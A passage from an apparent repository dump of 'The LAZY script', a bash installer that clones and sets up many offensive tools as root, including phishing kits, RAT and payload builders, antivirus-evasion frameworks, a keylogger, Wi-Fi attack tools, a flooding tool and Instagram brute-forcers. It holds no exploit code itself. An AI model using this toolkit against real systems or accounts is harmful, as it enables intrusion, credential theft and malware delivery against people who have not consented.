requirements.txt\n\t\tfi\n\t}\n\tfunction install_ghostphisher\n\t{\n\t\tfoldname=\"ghost-phisher\"\n\t\tgitlink=\"https://github.com/savio-code/ghost-phisher.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tchmod +x /root/ghost-phisher/Ghost-Phisher/ghost.py\n\t\tfi\n\t}\n\tfunction install_theeye\n\t{\n\t\tfoldname=\"The-Eye\"\n\t\tgitlink=\"https://github.com/EgeBalci/The-Eye.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tchmod +x TheEye\t\n\t\tfi\n\t}\n\tfunction install_xerxes\n\t{\n\t\tfoldname=\"xerxes\"\n\t\tgitlink=\"https://github.com/zanyarjamal/xerxes.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tgcc xerxes.c -o xerxes\t\n\t\tfi\n\t}\n\tfunction install_mdk3\n\t{\n\t\tfoldname=\"mdk3-master\"\n\t\tgitlink=\"https://github.com/wi-fi-analyzer/mdk3-master.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tmake\n\t\t\tmake install\n\t\tfi\n\t}\n\tfunction install_katana\n\t{\n\t\tfoldname=\"KatanaFramework\"\n\t\tgitlink=\"https://github.com/PowerScript/KatanaFramework.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tsh dependencies\n\t\t\tpython install\n\t\tfi\n\t}\n\tfunction install_airgeddon\n\t{\n\t\tfoldname=\"airgeddon\"\n\t\tgitlink=\"https://github.com/v1s1t0r1sh3r3/airgeddon.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tchmod +x airgeddon.sh\n\t\tfi\n\t}\n\tfunction install_4nonimizer\n\t{\n\t\tfoldname=\"4nonimizer\"\n\t\tgitlink=\"https://github.com/Hackplayers/4nonimizer.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tchmod +x 4nonimizer\n\t\t\t./4nonimizer install\n\t\t\tclear\n\t\t\tcd\n\t\t\tapt-get install -y python-pip\n\t\t\tapt-get install -y php-curl\n\t\t\tgem install pcaprub\n\t\t\tgem install packetfu\t\n\t\tfi\n\t}\n\tfunction install_beelogger\n\t{\n\t\tfoldname=\"BeeLogger\"\n\t\tgitlink=\"https://github.com/4w4k3/BeeLogger.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tchmod +x install.sh\n\t\t\t./install.sh\n\t\t\tcd\n\t\t\tapt-get install -y python-pip\n\t\t\tapt-get install -y php-curl\n\t\t\tgem install pcaprub\n\t\t\tgem install packetfu\n\t\tfi\n\t}\n\tfunction install_ezsploit\n\t{\n\t\tfoldname=\"ezsploit\"\n\t\tgitlink=\"https://github.com/rand0m1ze/ezsploit.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tchmod +x ezsploit.sh\n\t\tfi\n\t}\n\tfunction install_pupy\n\t{\n\t\tfoldname=\"pupy\"\n\t\tgitlink=\"https://github.com/n1nj4sec/pupy.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tgit submodule init\n\t\t\tgit submodule update\n\t\t\tcd pupy\n\t\t\tpip install -r requirements.txt\n\t\tfi\n\t}\n\tfunction install_zirikatu\n\t{\n\t\tfoldname=\"zirikatu\"\n\t\tgitlink=\"https://github.com/pasahitz/zirikatu.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tchmod +x zirikatu.sh\n\t\tfi\n\t}\n\tfunction install_wifiautopwner\n\t{\n\t\tfoldname=\"WiFi-autopwner\"\n\t\tgitlink=\"https://github.com/Mi-Al/WiFi-autopwner.git\"\n\t\tinstall_default\n\t}\n\tfunction install_bully\n\t{\n\t\tfoldname=\"bully\"\n\t\tgitlink=\"https://github.com/aanarchyy/bully.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tcd src\n\t\t\tmake\n\t\t\tsudo make install\n\t\tfi\t\t\n\t}\n\tfunction install_anonsurf\n\t{\n\t\tfoldname=\"kali-anonsurf\"\n\t\tgitlink=\"https://github.com/Und3rf10w/kali-anonsurf.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tchmod +x installer.sh\n\t\t\t./installer.sh\n\t\tfi\n\t}\n\tfunction install_anonym8\n\t{\n\t\tfoldname=\"anonym8\"\n\t\tgitlink=\"https://github.com/HiroshiManRise/anonym8.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tchmod +x INSTALL.sh\n\t\t\t./INSTALL.sh\n\t\tfi\n\t}\n\tfunction install_thefatrat\n\t{\n\t\tfoldname=\"TheFatRat\"\n\t\tgitlink=\"https://github.com/Screetsec/TheFatRat.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tchmod +x setup.sh && ./setup.sh\t\n\t\tfi\n\t}\n\tfunction install_angryip\n\t{\n\t\tcd\n\t\tif [[ -f \"/root/ipscan_*\" ]]\n\t\tthen\n\t\t\techo -e \"Removing old file\"\n\t\t\tsleep 2\n\t\t\trm -f /root/ipscan_*\n\t\tfi\n\t\techo -e \"Downloading angryipscanner\"\n\t\tsleep 2\n\t\twget https://github.com/angryip/ipscan/releases/download/3.5.2/ipscan_3.5.2_amd64.deb\n\t\techo -e \"Installing...\"\n\t\tdpkg -i ipscan_3.5.2*\n\t\techo -e \"Done\"\n\t\tsleep 1\n\t}\n\tfunction install_sniper\n\t{\n\t\tfoldname=\"Sn1per\"\n\t\tgitlink=\"https://github.com/1N3/Sn1per.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tchmod +x install.sh\n\t\t\t./install.sh\n\t\tfi\n\t}\n\tfunction install_recondog\n\t{\n\t\tfoldname=\"ReconDog\"\n\t\tgitlink=\"https://github.com/UltimateHackers/ReconDog.git\"\n\t\tinstall_default\n\t}\n\tfunction install_redhawk\n\t{\n\t\tfoldname=\"RED_HAWK\"\n\t\tgitlink=\"https://github.com/Tuhinshubhra/RED_HAWK.git\"\n\t\tinstall_default\n\t}\n\tfunction install_winpayloads\n\t{\n\t\tfoldname=\"Winpayloads\"\n\t\tgitlink=\"https://github.com/nccgroup/Winpayloads.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tchmod +x setup.sh\n\t\t\t./setup.sh\n\t\tfi\n\t}\n\tfunction install_chaos\n\t{\n\t\tapt install golang upx-ucl -y\n\t\tcd\n\t\tfoldname=\"CHAOS\"\n\t\tgitlink=\"https://github.com/tiagorlampert/CHAOS.git\"\n\t\tinstall_default\n\t}\n\tfunction install_routersploit\n\t{\n\t\tfoldname=\"routersploit\"\n\t\tgitlink=\"https://github.com/reverse-shell/routersploit.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tapt-get install python3-pip\n\t\t\tpython3 -m pip install -r requirements.txt\n\t\t\tpython setup.py install\n\t\tfi\n\t}\n\tfunction install_infoga\n\t{\n\t\tfoldname=\"Infoga\"\n\t\tgitlink=\"https://github.com/m4ll0k/Infoga.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tpip install -r requirements.txt\n\t\tfi\n\t}\n\tfunction install_nwatch\n\t{\n\t\tfoldname=\"nWatch\"\n\t\tgitlink=\"https://github.com/suraj-root/nWatch.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tpip install scapy\n\t\t\tpip install colorama\n\t\t\tpip install nmap\n\t\t\tpip install ctypes\n\t\t\tpip2.7 install scapy\n\t\t\tpip2.7 install colorama\n\t\t\tpip2.7 install nmap\n\t\t\tpip2.7 install ctypes\n\t\tfi\n\t}\n\tfunction install_eternalscanner\n\t{\n\t\tfoldname=\"eternal_scanner\"\n\t\tgitlink=\"https://github.com/peterpt/eternal_scanner.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tapt-get install -y masscan metasploit-framework\n\t\tfi\n\t}\n\tfunction install_eaphammer\n\t{\n\t\tfoldname=\"eaphammer\"\n\t\tgitlink=\"https://github.com/s0lst1c3/eaphammer.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tchmod +x kali-setup\n\t\t\t./kali-setup\n\t\t\tapt-get install -y python-tqdm\n\t\tfi\n\t}\n\tfunction install_dagon\n\t{\n\t\tfoldname=\"dagon\"\n\t\tgitlink=\"https://github.com/ekultek/dagon.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tpip install -r requirements.txt\n\t\t\tpip2.7 install -r requirements.txt\n\t\t\tapt-get install -y bcrypt\n\t\tfi\n\t}\n\tfunction install_lalin\n\t{\n\t\tfoldname=\"LALIN\"\n\t\tgitlink=\"https://github.com/Screetsec/LALIN.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tchmod +x Lalin.sh\n\t\tfi\n\t}\n\tfunction install_knockmail\n\t{\n\t\tfoldname=\"KnockMail\"\n\t\tgitlink=\"https://github.com/4w4k3/KnockMail.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tpip install -r requeriments.txt\n\t\tfi\n\t}\n\tfunction install_kwetza\n\t{\n\t\tfoldname=\"kwetza\"\n\t\tgitlink=\"https://github.com/sensepost/kwetza.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tpip install beautifulsoup4\n\t\t\tpip2.7 install beautifulsoup4\n\t\tfi\n\t}\n\tfunction install_ngrok\n\t{\n\t\tif [[ -f /root/ngrok || -f /root/ngrok.zip ]]\n\t\tthen\n\t\t\techo -e \"Removing old...\"\n\t\t\techo -e \"$PAKTC\"\n\t\t\t$READAK\n\t\t\trm -f /root/ngrok\n\t\t\trm -f /root/ngrok.zip\n\t\tfi\n\t\trm -f /root/ngrok.zip\n\t\tcd\n\t\techo -e \"Downloading Ngrok\"\n\t\twget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip --output-document=/root/ngrok.zip\n\t\techo -e \"Unzipping Ngrok\"\n\t\tunzip /root/ngrok.zip\n\t}\n\tfunction install_netdiscover\n\t{\n\t\tapt-get install -y netdiscover\t\n\t}\n\tfunction install_websploit\n\t{\n\t\tapt-get install -y websploit\n\t}\n\tfunction install_openvas\n\t{\n\t\tapt-get install -y openvas\n\t\topenvas-setup\n\t}\n\tfunction install_shellter\n\t{\n\t\tapt-get install -y shellter\n\t}\n\tfunction install_geany\n\t{\n\t\tapt-get install -y geany\n\t}\n\tfunction install_bleachbit\n\t{\n\t\tapt-get install -y bleachbit\n\t}\n\tfunction install_vmr\n\t{\n\t\tif [[ -d /root/mdk3-v6 || -d /root/VMR ]]\n\t\tthen\n\t\t\techo -e \"Removing old...\"\n\t\t\techo -e \"$PAKTC\"\n\t\t\t$READAK\n\t\t\trm -r /root/mdk3-v6\n\t\t\tif [[ -f /root/VMR-MDK-K2-2017R-012x2.zip ]]\n\t\t\tthen\n\t\t\t\trm /root/VMR-MDK-K2-2017R-012x2.zip\n\t\t\tfi\n\t\t\tif [[ -d /root/VMR ]]\n\t\t\tthen\n\t\t\t\trm -r /root/VMR\n\t\t\tfi\n\t\tfi\n\t\tcd\n\t\twget https://github.com/musket33/VMR-MDK-Kali2-Kali2016/raw/master/VMR-MDK-K2-2017R-012x2.zip\n\t\tunzip /root/VMR-MDK-K2-2017R-012x2.zip -d /root/VMR\n\t\tcp -r /root/VMR/mdk3-v6 /root/\n\t\tcd /root/mdk3-v6\n\t\tmake\n\t\tmake install\n\t\tchmod 755 /root/mdk3-v6/*\n\t\tchmod +x /root/VMR/*.sh\n\t\tcd\n\t}\n\tfunction install_hashbuster\n\t{\n\t\tfoldname=\"Hash-Buster\"\n\t\tgitlink=\"https://github.com/UltimateHackers/Hash-Buster.git\"\n\t\tinstall_default\n\t}\n\tfunction install_findsploit\n\t{\n\t\tfoldname=\"Findsploit\"\n\t\tgitlink=\"https://github.com/1N3/Findsploit.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tchmod +x install.sh\n\t\t\t./install.sh\n\t\tfi\n\t}\n\tfunction install_howdoi\n\t{\n\t\tpip install howdoi\n\t\tpip2.7 install howdoi\n\t}\n\tfunction install_operative\n\t{\n\t\tfoldname=\"operative-framework\"\n\t\tgitlink=\"https://github.com/graniet/operative-framework.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tpip install -r requirements.txt\n\t\t\tpip2.7 install -r requirements.txt\n\t\tfi\n\t}\n\tfunction install_netattack2\n\t{\n\n\t\tfoldname=\"netattack2\"\n\t\tgitlink=\"https://github.com/chrizator/netattack2.git\"\n\t\tinstall_default\n\t}\n\tfunction install_koadic\n\t{\n\t\tfoldname=\"koadic\"\n\t\tgitlink=\"https://github.com/zerosum0x0/koadic.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tpip install -r requirements.txt\n\t\t\tpip2.7 install -r requirements.txt\n\t\tfi\n\t}\n\tfunction install_empire\n\t{\n\t\tfoldname=\"Empire\"\n\t\tgitlink=\"https://github.com/EmpireProject/Empire.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tchmod +x setup/install.sh\n\t\t\tcd setup\n\t\t\t./install.sh\n\t\t\t./setup_database.py\n\t\tfi\n\t}\n\tfunction install_meterpreter_paranoid_mode\n\t{\n\t\tfoldname=\"Meterpreter_Paranoid_Mode-SSL\"\n\t\tgitlink=\"https://github.com/r00t-3xp10it/Meterpreter_Paranoid_Mode-SSL.git\"\n\t\tinstall_default\n\t}\n\tfunction install_dropit_frmw\n\t{\n\t\tfoldname=\"Dr0p1t-Framework\"\n\t\tgitlink=\"https://github.com/D4Vinci/Dr0p1t-Framework.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tcd\n\t\t\tgit clone $gitlink\n\t\t\tchmod 777 -R Dr0p1t-Framework\n\t\t\tcd Dr0p1t-Framework\n\t\t\tchmod +x install.sh\n\t\t\t./install.sh\n\t\tfi\n\t}\n\tfunction install_wifi_pumpkin\n\t{\n\t\tfoldname=\"WiFi-Pumpkin\"\n\t\tgitlink=\"https://github.com/P0cL4bs/WiFi-Pumpkin.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\t./installer.sh --install\n\t\tfi\n\t}\n\tfunction install_veil\n\t{\n\t\tfoldname=\"Veil\"\n\t\tgitlink=\"https://github.com/Veil-Framework/Veil.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tcd setup\n\t\t\t./setup.sh -c\n\t\tfi\n\t}\n\tfunction install_leviathan\n\t{\n\t\tfoldname=\"leviathan\"\n\t\tgitlink=\"https://github.com/leviathan-framework/leviathan.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tpip install -r requirements\n\t\t\tpip2.7 install -r requirements\n\t\tfi\n\t}\n\tfunction install_fake_image\n\t{\n\t\tfoldname=\"FakeImageExploiter\"\n\t\tgitlink=\"https://github.com/r00t-3xp10it/FakeImageExploiter.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tchmod +x *.sh\n\t\tfi\n\t}\n\tfunction install_avet\n\t{\n\t\tfoldname=\"avet\"\n\t\tgitlink=\"https://github.com/govolution/avet.git\"\n\t\tinstall_default\n\t}\n\tfunction install_gloom\n\t{\n\t\tfoldname=\"Gloom-Framework\"\n\t\tgitlink=\"https://github.com/StreetSec/Gloom-Framework.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tpython install.py\n\t\tfi\n\t}\n\tfunction install_arcanus\n\t{\n\t\tfoldname=\"ARCANUS\"\n\t\tgitlink=\"https://github.com/EgeBalci/ARCANUS.git\"\n\t\tinstall_default\n\t}\n\tfunction install_msfpc\n\t{\n\t\tapt-get install -y msfpc\n\t}\n\tfunction install_morphhta\n\t{\n\t\tfoldname=\"morphHTA\"\n\t\tgitlink=\"https://github.com/vysec/morphHTA.git\"\n\t\tinstall_default\n\t}\n\tfunction install_lfi\n\t{\n\t\tfoldname=\"LFISuite\"\n\t\tgitlink=\"https://github.com/D35m0nd142/LFISuite.git\"\n\t\tinstall_default\n\t}\n\tfunction install_unibyav\n\t{\n\t\tfoldname=\"UniByAv\"\n\t\tgitlink=\"https://github.com/Mr-Un1k0d3r/UniByAv.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tapt-get install -y mingw-w64\n\t\tfi\n\t}\n\tfunction install_demiguise\n\t{\n\t\tfoldname=\"demiguise\"\n\t\tgitlink=\"https://github.com/nccgroup/demiguise.git\"\n\t\tinstall_default\n\t}\n\tfunction install_dkmc\n\t{\n\t\tfoldname=\"DKMC\"\n\t\tgitlink=\"https://github.com/Mr-Un1k0d3r/DKMC.git\"\n\t\tinstall_default\n\t}\n\tfunction install_sechub\n\t{\n\t\tfoldname=\"secHub\"\n\t\tgitlink=\"https://github.com/cys3c/secHub.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tpython installer.py\n\t\t\tchmod +x /usr/bin/sechub\n\t\tfi\n\t}\n\tfunction install_beef\n\t{\n\t\tapt-get install beef-xss\n\t}\n\tfunction install_mitmf\n\t{\n\t\tapt-get -y install python-dev python-setuptools libpcap0.8-dev libnetfilter-queue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file\n\t\tfoldname=\"MITMf\"\n\t\tgitlink=\"https://github.com/byt3bl33d3r/MITMf\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tgit submodule init\n\t\t\tgit submodule update --recursive\n\t\t\tpip install -r requirements.txt\n\t\t\tpip2.7 install -r requirements.txt\n\t\tfi\n\t}\n\tfunction install_arp_scan\n\t{\n\t\tapt-get -y install arp-scan\n\t}\n\tfunction install_netool\n\t{\n\t\tfoldname=\"opensource\"\n\t\tgitlink=\"https://github.com/r00t-3xp10it/netool-toolkit\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tchmod +x INSTALL.sh && ./INSTALL.sh\n\t\tfi\n\t}\n\tfunction install_sqlmap\n\t{\n\t\tapt-get install sqlmap\n\t}\n\tfunction install_patator\n\t{\n\t\tfoldname=\"patator\"\n\t\tgitlink=\"https://github.com/lanjelot/patator.git\"\t\t\n\t\tinstall_default\n\t}\n\tfunction install_zeus\n\t{\n\t\tfoldname=\"Zeus-Scanner\"\n\t\tgitlink=\"https://github.com/Ekultek/Zeus-Scanner.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tpip install -r requirements.txt\n\t\t\tpip2.7 install -r requirements.txt\n\t\tfi\n\t}\n\tfunction install_evil_droid\n\t{\n\t\tfoldname=\"Evil-Droid\"\n\t\tgitlink=\"https://github.com/M4sc3r4n0/Evil-Droid.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tchmod +x evil-droid\n\t\tfi\n\t}\n\tfunction install_nosqlmap\n\t{\n\t\tfoldname=\"NoSQLMap\"\n\t\tgitlink=\"https://github.com/codingo/NoSQLMap.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tpython setup.py install\n\t\tfi\n\t}\n\tfunction install_eggshell\n\t{\n\t\tfoldname=\"EggShell\"\n\t\tgitlink=\"https://github.com/neoneggplant/EggShell.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\teasy_install pycrypto\n\t\t\tpython eggshell.py\n\t\tfi\n\t}\n\tfunction install_zerodoor\n\t{\n\t\tfoldname=\"Zerodoor\"\n\t\tgitlink=\"https://github.com/Souhardya/Zerodoor.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t}\n\tfunction install_objection\n\t{\n\t\tpip3 install objection\n\t\tfoldname=\"objection\"\n\t\tgitlink=\"https://github.com/sensepost/objection.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tpython setup.py\n\t\tfi\n\t}\n\tfunction install_cromos\n\t{\n\t\tfoldname=\"cromos\"\n\t\tgitlink=\"https://github.com/evilsocketbr/cromos.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tpython setup.py\n\t\tfi\n\t}\n\tfunction install_fsociety\n\t{\n\t\tfoldname=\"fsociety\"\n\t\tgitlink=\"https://github.com/Manisso/fsociety.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tchmod +x install.sh\n\t\t\t./install.sh\n\t\tfi\n\t}\n\tfunction install_yuki-chan\n\t{\n\t\tfoldname=\"Yuki-Chan-The-Auto-Pentest\"\n\t\tgitlink=\"https://github.com/Yukinoshita47/Yuki-Chan-The-Auto-Pentest.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tchmod 777 wafninja joomscan install-perl-module.sh yuki.sh\n\t\t\tchmod 777 Module/WhatWeb/whatweb\n\t\t\tpip install -r requirements.txt\n\t\t\tchmod +x *.sh\n\t\t\t./install-perl-module.sh\n\t\tfi\n\t}\n\tfunction install_socialfish\n\t{\n\t\tfoldname=\"SocialFish\"\n\t\tgitlink=\"https://github.com/UndeadSec/SocialFish.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tpip install -r requirements.txt\n\t\t\tpip2.7 install -r requirements.txt\n\t\tfi\n\t}\n\tfunction install_autosploit\n\t{\n\t\tfoldname=\"AutoSploit\"\n\t\tgitlink=\"https://github.com/NullArray/AutoSploit.git\"\n\t\tinstall_default\n\t}\n\tfunction install_blazy\n\t{\n\t\tfoldname=\"Blazy\"\n\t\tgitlink=\"https://github.com/UltimateHackers/Blazy.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tpip install -r requirements.txt\n\t\tfi\n\t}\n\tfunction install_striker\n\t{\n\t\tfoldname=\"Striker\"\n\t\tgitlink=\"https://github.com/UltimateHackers/Striker.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tpip install -r requirements.txt\n\t\tfi\n\t}\n\tfunction install_hyprpulse\n\t{\n\t\tfoldname=\"hyprPulse\"\n\t\tgitlink=\"https://github.com/Ethical-H4CK3R/hyprPulse.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tchmod +x install.sh\n\t\t\tpip2.7 install -r requirements.txt\n\t\t\t./install.sh\n\t\t\t\n\t\tfi\n\t}\n\tfunction install_instaburst\n\t{\n\t\tfoldname=\"InstaBurst\"\n\t\tgitlink=\"https://github.com/Ethical-H4CK3R/InstaBurst.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tchmod +x install.sh\n\t\t\tpip2.7 install -r requirements.txt\n\t\t\t./install.sh\n\t\t\t\n\t\tfi\n\t}\n\tfunction install_sitebroker\n\t{\n\t\tfoldname=\"SiteBroker\"\n\t\tgitlink=\"https://github.com/Anon-Exploiter/SiteBroker\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tpip install -r requirements.txt\n\t\t\tpip2.7 install -r requirements.txt\n\t\tfi\n\t}\n\tfunction install_enigma\n\t{\n\t\tfoldname=\"Enigma\"\n\t\tgitlink=\"https://github.com/UndeadSec/Enigma.git\"\n\t\tinstall_default\n\t}\n\tfunction install_datasploit\n\t{\n\t\tfoldname=\"datasploit\"\n\t\tgitlink=\"https://github.com/DataSploit/datasploit.git\"\n\t\tinstall_default\n\t\tcloned=$?\n\t\tif [[ \"$cloned\" == 1 ]]\n\t\tthen\n\t\t\tpip install --upgrade --force-reinstall -r requirements.txt\n\t\t\tpip2.7 install --upgrade --force-reinstall -r requirements.txt\n\t\tfi\n\t}\n\tfunction install_instagram-py\n\t{\n\t\tif [[ -f /usr/local/bin/instagram-py ]]\n\t\tthen\n\t\t\techo -e \"\"$YS\"Upgrading...\"$CE\"\"\n\t\t\tpip3 install instagram-py --upgrade\n\t\telse\n\t\t\techo -e \"\"$YS\"Installing...\"$CE\"\"\n\t\t\teasy_install3 -U pip\n\t\t\tpip3 install requests --upgrade\n\t\t\tpip3 install requests[socks]\n\t\t\tpip3 install stem\n\t\t\tpip3 install instagram-py\n\t\t\tinstagram-py --create-configuration\n\t\tfi\n\t}\n\n\t\t\n#------------------------------------\n####################################\ndefaults_l\nprintf '\\033]2;The LAZY script\\a'\nif [[ \"$ONETIMEPERLAUNCH\" != \"1\" ]]\nthen\n\tone_time_per_launch_ks\nfi\n####################################\nif [[ -f \"\"$LPATH\"/IAGREE.txt\" ]]\nthen\n\n\tif [[ ! -f \"\"$LPATH\"/wlan.txt\" ]]\n\tthen\n\t\tset_interface_number\n\tfi\n\tif [[ ! -f \"\"$LPATH\"/wlanmon.txt\" ]]\n\tthen\n\t\tset_interface_number\n\tfi\n\tif [[ ! -f \"\"$LPATH\"/eth.txt\" ]]\n\tthen\n\t\tset_interface_number\n\tfi\n\tclear\n\tWLANNM=$(cat \"$LPATH\"/wlanmon.txt)\n\tWLANN=$(cat \"$LPATH\"/wlan.txt)\n\tETH=$(cat \"$LPATH\"/eth.txt)\t\n#setting iftop's interface\n\tif [[ -f \"$LPATH\"/settings/iftopint.txt ]]\n\tthen\n\t\tread iftopint < \"$LPATH\"/settings/iftopint.txt\n\telse\n\t\tiftopint=\"$WLANN\"\n\tfi\n\texport iftopint\n\texport WLANNM\n\texport WLANN\n\texport ETH\n\tmanaged_spaces\n\tmonitor_spaces\n\tif [[ ! -f \"$LPATH\"/latestchangelog.txt ]]\n\tthen\n\t\techo -e \"1\" > \"$LPATH\"/latestchangelog.txt\n\t\tlatest_changelog\n\tfi\t\t\n\tbanner\n\tmain_options\n\tif [[ \"$BACKL\" = \"1\" ]]\n\tthen\n\t\texec bash \"$0\"\n\t\t\n\telse\n\t\techo -e \"$PAKTGB\"\n\t\t$READAK\n\t\texec bash \"$0\"\n\tfi\nelse\n\tterms_of_use\nfi\n"
        },
        {
          "name": "lh1",
          "type": "blob",
          "size": 20.9873046875,
